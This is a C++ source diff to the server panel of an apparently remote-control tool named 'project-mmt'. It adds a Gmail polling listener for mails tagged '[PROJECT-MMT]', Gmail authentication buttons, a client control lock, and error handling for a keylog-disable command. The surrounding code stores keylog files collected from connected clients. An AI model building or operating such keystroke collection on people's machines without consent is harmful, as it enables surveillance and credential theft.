@@ -10,6 +10,7 @@
 #include "ThreadWrapper.hpp"
 #include "Message.hpp"
 #include "ImGuiScrollableText.hpp"
+#include "GmailLib.hpp"
 
 #define DEFAULT_PORT 62300
 
@@ -17,6 +18,41 @@ std::map<std::string, uint32_t> clientNamingPool;
 GuiScrollableTextDisplay miniConsole;
 
 const std::string serverTempFolderName = "server_tmp";  //must not be empty string !
+
+GmailHandler gmail;
+MailMessage mailMsg;
+
+///////////////////////////////////////////////
+
+void MailListener() {
+    const std::string subject_to_find = "\"[PROJECT-MMT]\""; // Use quotes for exact phrases
+    const int polling_interval_seconds = 15;
+    // On first run, check last 10 mins
+    long long last_check_timestamp = getCurrentUnixTime() - 600;
+
+    while (true) {
+        long long next_check_timestamp = getCurrentUnixTime();
+        std::string query = "subject:" + subject_to_find + " after:" + std::to_string(last_check_timestamp);
+
+        // Get new messages
+        std::vector<std::string> new_message_ids;
+        // cout << "timestamp " << last_check_timestamp << ". ";
+        if(gmail.queryMessages(query, new_message_ids)) {
+            // cout << "query success " << new_message_ids.size() << " elements\n";
+            for(const auto& id : new_message_ids) {
+                MailMessage mailIdMsg;
+                gmail.getEmail(id, mailIdMsg);
+                miniConsole.AddLineSuccess("Mail received. From %s. Subject: %s. Body:\n%s", mailIdMsg.from.c_str(), mailIdMsg.subject.c_str(), mailIdMsg.body_text.c_str());
+                std::this_thread::sleep_for(std::chrono::seconds(polling_interval_seconds/6));
+            }
+        } else {
+            // cout << "query failed\n";
+        }
+
+        last_check_timestamp = next_check_timestamp;
+        std::this_thread::sleep_for(std::chrono::seconds(polling_interval_seconds));
+    }
+}
 
 ///////////////////////////////////////////////////////
 
@@ -46,6 +82,19 @@ public:
 
 private:
     void executeMessage(const Message& msg) {
+        if(msg.returnCode == 0) {
+            std::string errorString = "";
+            json jsonData = std::string(msg.getJsonData(), msg.getJsonDataSize());
+            if(jsonData.contains("errorString")) errorString = jsonData.at("errorString");
+            switch(msg.commandNumber) {
+                case MessageDisableKeylog: {
+                    miniConsole.AddLineError("MessageDisableKeylog failed: %s", errorString.c_str());
+                    break;
+                }
+            }
+            return;
+        }
+
         switch(msg.commandNumber) {
             case MessageDisableKeylog: {
                 std::string filename = serverTempFolderName + "/keylog_" + getCurrentIsoTime() + ".txt";
@@ -302,17 +351,6 @@ public:
         int reuse = 1;
         setsockopt(newSocket, SOL_SOCKET, SO_REUSEADDR, reinterpret_cast<const char*>(&reuse), sizeof(reuse));
 
-        /*
-        // Non-blocking mode for graceful shutdown
-        #ifdef WIN32
-            u_long mode = 1;
-            ioctlsocket(newSocket, FIONBIO, &mode);
-        #else
-            int flags = fcntl(newSocket, F_GETFL, 0);
-            fcntl(newSocket, F_SETFL, flags | O_NONBLOCK);
-        #endif
-        */
-
         // Bind socket
         sockaddr_in sa;
         memset(&sa, 0, sizeof(sa));
@@ -360,9 +398,51 @@ public:
 
 ///////////////////////////////////////////////////
 
+bool doGmailFullAuth = false;
+bool isModalBlocking = false;
+
 void RunGui() {
     ImGui::SetNextWindowSize(ImVec2(800, 600), ImGuiCond_Once);
     ImGui::Begin("Server Panel", nullptr, ImGuiWindowFlags_NoCollapse);
+    ImGui::SeparatorText("Gmail");
+    if(doGmailFullAuth) {
+        if(ImGui::Button("Authenticate Gmail")) {
+            std::thread([]() {
+                isModalBlocking = true;
+                if(gmail.auth()) {
+                    doGmailFullAuth = false;
+                    miniConsole.AddLineSuccess("Auth success");
+                } else {
+                    miniConsole.AddLineError("Auth failed");
+                }
+                isModalBlocking = false;
+            }).detach();
+        }
+    } else {
+        if(ImGui::Button("Reauthenticate Gmail (automatic)")) {
+            std::thread([]() {
+                isModalBlocking = true;
+                if(gmail.reauth("")) {
+                    miniConsole.AddLineSuccess("Re-auth success");
+                } else {
+                    miniConsole.AddLineError("Re-auth failed");
+                    doGmailFullAuth = true;
+                }
+                isModalBlocking = false;
+            }).detach();
+        }
+    }
+
+    if(isModalBlocking) {
+        ImGui::OpenPopup("Loading...");
+    }
+
+    if (ImGui::BeginPopupModal("Loading...", &isModalBlocking, ImGuiWindowFlags_NoTitleBar | ImGuiWindowFlags_NoResize | ImGuiWindowFlags_NoCollapse | ImGuiWindowFlags_NoMove)) {
+        ImGui::ProgressBar(-1.0f * (float)ImGui::GetTime(), ImVec2(320.0f, 50.0f), "Loading..");
+        if(!isModalBlocking) ImGui::CloseCurrentPopup();
+        ImGui::EndPopup();
+    }
+    
     ImGui::SeparatorText("Connected Clients");
     ImGui::Text("Active clients: %zu", clientVector.size());
     
@@ -373,6 +453,8 @@ void RunGui() {
         if (ImGui::CollapsingHeader(headerLabel.c_str())) {
             ImGui::Text("Connected for %llus", client.getConnectionDuration());
             
+            ImGui::Checkbox(client.makeWidgetName("Lock control panel").c_str(), &client.funcStruct.isControlLocked);
+            ImGui::BeginDisabled(client.funcStruct.isControlLocked);
             ImGui::InputTextMultiline(client.makeWidgetName("Message Input").c_str(), &client.funcStruct.rawText, ImVec2(600, 55));
             
             // Send button
@@ -531,6 +613,7 @@ void RunGui() {
                 }).detach();
                 clientVector.removeInactive();
             }
+            ImGui::EndDisabled();
         }
         clientVector.removeInactive();
     };
@@ -568,6 +651,7 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, WCHAR *lpCmdLi
     UNREFERENCED_PARAMETER(lpCmdLine);
     UNREFERENCED_PARAMETER(nCmdShow);
     if(!CreateDirectoryCrossPlatform(serverTempFolderName)) {
+
         std::cerr << "Fatal error: Can't create folder for temporary server data\n";
         return -1;
     }
@@ -575,11 +659,27 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, WCHAR *lpCmdLi
     WSADATA wsaData;
     // Initialize Winsock
     if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
+        allocateConsoleWin();
         std::cerr << "WSAStartup failed\n";
         return 1;
     }
 
+    //Setup connection manager
     connectionManager.init();
+
+    //Setup gmail
+    if(!gmail.loadCredential("credential.json")) {
+        allocateConsoleWin();
+        std::cerr << "Failed to load essential credential\n";
+        return -1;
+    }
+    if(!gmail.reauth("")) {
+        doGmailFullAuth = true;
+    }
+
+    //Setup mail listener (listen indefinitely even invalid token, still safe)
+    std::thread(MailListener).detach();
+
 
     //Setup GUI
     /////////////////////////////////////////////////////
@@ -589,9 +689,9 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, WCHAR *lpCmdLi
     float main_scale = ImGui_ImplWin32_GetDpiScaleForMonitor(::MonitorFromPoint(POINT{ 0, 0 }, MONITOR_DEFAULTTOPRIMARY));
 
     // Create application window
-    WNDCLASSEXW wc = { sizeof(wc), CS_CLASSDC, WndProc, 0L, 0L, GetModuleHandle(nullptr), nullptr, nullptr, nullptr, nullptr, L"ImGui Example", nullptr };
+    WNDCLASSEXW wc = { sizeof(wc), CS_CLASSDC, WndProc, 0L, 0L, GetModuleHandle(nullptr), nullptr, nullptr, nullptr, nullptr, L"project-mmt", nullptr };
     ::RegisterClassExW(&wc);
-    HWND hwnd = ::CreateWindowW(wc.lpszClassName, L"Dear ImGui DirectX9 Example", WS_OVERLAPPEDWINDOW, 100, 100, (int)(1280 * main_scale), (int)(800 * main_scale), nullptr, nullptr, wc.hInstance, nullptr);
+    HWND hwnd = ::CreateWindowW(wc.lpszClassName, L"project-mmt SERVER", WS_OVERLAPPEDWINDOW, 100, 100, (int)(1280 * main_scale), (int)(800 * main_scale), nullptr, nullptr, wc.hInstance, nullptr);
 
     // Initialize Direct3D
     if (!CreateDeviceD3D(hwnd))
